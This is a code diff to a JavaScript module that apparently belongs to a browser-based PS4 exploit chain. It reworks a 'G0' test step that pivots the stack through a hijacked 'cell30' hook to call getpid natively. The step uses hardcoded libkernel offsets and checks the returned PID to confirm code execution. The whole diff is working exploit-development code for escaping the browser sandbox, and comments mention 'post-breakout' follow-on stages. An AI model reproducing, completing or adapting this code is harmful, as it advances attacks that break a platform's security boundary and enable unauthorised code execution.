@@ -11,9 +11,43 @@ import { captureParseIntMainMf, loadStubCap } from "./stub_call.js?v=stub-7";
 let g0Prep = null;
 const SS_G0_FIRED = "wk-g0-fired";
 
-/** Frame @ F is errno-style: 0 = success (same as notify). Not raw pid. */
+/** k_notify / similar — frame rax 0 = success. */
 export function nativeRetOk(ret) {
     return ret === 0;
+}
+
+/**
+ * getpid stub — default raw syscall @ lk+k_getpid_syscall (rax = PID).
+ * ?getpid=wrap → BillZai wrapper @ k_stubs[20] (legacy ret=0 “OK”).
+ */
+export function resolveG0GetpidStubOff(off, opts) {
+    opts = opts || {};
+    const q = opts.getpidMode
+        || (typeof location !== "undefined"
+            ? new URLSearchParams(location.search).get("getpid") : null)
+        || "raw";
+    if (q === "wrap" || q === "stub20" || q === "billzai") {
+        const stubOff = (off.k_stubs && off.k_stubs[20] != null)
+            ? off.k_stubs[20] : 0x2cb70;
+        return {
+            stubOff,
+            mode: "wrap",
+            tag: "wrap+0x" + stubOff.toString(16),
+        };
+    }
+    const stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
+    return {
+        stubOff,
+        mode: "raw",
+        tag: "syscall+0x" + stubOff.toString(16),
+    };
+}
+
+/** raw: pid > 0; wrap: legacy errno-style 0 = OK. */
+export function getpidRetOk(ret, mode) {
+    ret = ret | 0;
+    if (mode === "wrap") return ret === 0;
+    return ret > 0;
 }
 
 export function g0AlreadyFired() {
@@ -170,27 +204,41 @@ export function fireG0Smoke(p, off, opts) {
     return { path: "g0-smoke", cap };
 }
 
-/** G0 + cell30 hook + getpid stack — one shot per tab (errno 0 = OK). */
+/** G0 + cell30 hook + getpid — default raw syscall (want pid > 0 in rax). */
 export function fireG0Getpid(p, off, lk, opts) {
     opts = opts || {};
     if (!lk) throw new Error("g0 getpid: need lk");
     if (g0AlreadyFired() && !opts.allowRefire)
         throw new Error("g0: already fired — reload tab before refire");
     const prep = ensureG0Prep(p, off, lk, opts);
-    const stubOff = (off.k_stubs && off.k_stubs[20] != null) ? off.k_stubs[20] : 0x2cb70;
-    stubStep(opts, "G0-GETPID-FIRE", "stubOff=0x" + stubOff.toString(16) + " lk=" + lk);
-    const ret = firePivotGetpid(p, prep, lk, off, stubOff, {
+    const stub = resolveG0GetpidStubOff(off, opts);
+    stubStep(opts, "G0-GETPID-FIRE", stub.tag + " lk=" + lk
+        + (stub.mode === "raw" ? " (want pid>0)" : " (wrap ret=0)"));
+    const ret = firePivotGetpid(p, prep, lk, off, stub.stubOff, {
         hook: opts.hook || "cell30",
         carrier: opts.carrier || null,
         skipVerify: opts.skipVerify === true,
     });
     postFireCleanup(p, prep, opts);
     markG0Fired("getpid");
-    stubStep(opts, "G0-DONE", "errno=" + ret + (nativeRetOk(ret) ? " OK" : " fail"));
+    const ok = getpidRetOk(ret, stub.mode);
+    const doneDetail = stub.mode === "raw"
+        ? "pid=" + ret + (ok ? " OK" : " BAD")
+        : "wrap-ret=" + ret + (ok ? " OK" : " fail");
+    stubStep(opts, "G0-DONE", doneDetail);
     try {
-        sessionStorage.setItem("wk-native-getpid-ok", "errno=" + ret + "@" + Date.now());
+        sessionStorage.setItem("wk-native-getpid-ok",
+            (stub.mode === "raw" ? "pid=" : "wrap=") + ret + "@" + Date.now());
     } catch (_) { }
-    return { path: "g0-getpid", ret, errno: ret, ok: nativeRetOk(ret), prep };
+    return {
+        path: "g0-getpid",
+        ret,
+        pid: stub.mode === "raw" ? ret : null,
+        mode: stub.mode,
+        stubOff: stub.stubOff,
+        ok,
+        prep,
+    };
 }
 
 /** G0 + notify — PS4 direct k_notify (BDJ/mast1c0re). Dev write needs post-breakout. */
